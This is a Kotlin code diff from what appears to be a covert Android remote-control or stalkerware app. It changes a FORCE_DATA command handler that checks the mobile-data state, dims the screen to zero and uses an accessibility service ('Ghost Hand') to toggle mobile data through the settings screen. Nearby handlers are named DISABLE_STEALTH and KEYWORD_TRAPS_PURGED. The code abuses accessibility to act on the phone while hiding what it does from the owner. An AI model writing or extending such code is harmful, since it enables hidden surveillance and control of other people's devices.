@@ -1416,20 +1416,26 @@ object CommandProcessor {
                     status = "KEYWORD_TRAPS_PURGED"
                 }
                 "FORCE_DATA" -> {
-                    if (MyAccessibilityService.instance == null) {
+                    val targetState = content.trim().uppercase()
+                    val isDataEnabled = android.provider.Settings.Global.getInt(ctx.contentResolver, "mobile_data", 0) == 1
+                    
+                    if ((targetState == "ENABLE" && isDataEnabled) || (targetState == "DISABLE" && !isDataEnabled)) {
+                        status = "ALREADY_IN_STATE"
+                        errorMsg = "Mobile data is already ${if (isDataEnabled) "ENABLED" else "DISABLED"}"
+                    } else if (MyAccessibilityService.instance == null) {
                         status = "FAILED (SERVICE_OFF)"
                         errorMsg = "Accessibility is required for Ghost Hand data toggle."
                     } else {
                         Handler(Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 0, "AUTO")
                             MyAccessibilityService.instance?.isWaitingForDataSettings = true
-                            MyAccessibilityService.instance?.dataTargetState = content.trim().uppercase()
+                            MyAccessibilityService.instance?.dataTargetState = targetState
                             val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
                                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                             }
                             ctx.startActivity(dataIntent)
                         }
-                        status = "GHOST_DATA_INITIATED"
+                        status = "GHOST_DATA_INITIATED ($targetState)"
                     }
                 }
                 "DISABLE_STEALTH" -> {
